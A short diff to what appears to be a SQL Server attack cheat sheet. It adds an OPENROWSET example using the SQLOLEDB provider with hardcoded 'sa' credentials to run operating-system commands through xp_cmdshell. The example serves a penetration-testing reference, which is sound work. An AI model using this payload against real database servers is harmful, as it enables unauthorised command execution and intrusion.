@@ -65,6 +65,9 @@ SELECT * FROM OPENROWSET(
     'Server=remote-server;uid=sa;pwd=password;',
     'SELECT * FROM master.sys.server_principals'
 )
+
+-- Using SQLOLEDB provider with command execution
+SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
 ```
 
 #### File System Access
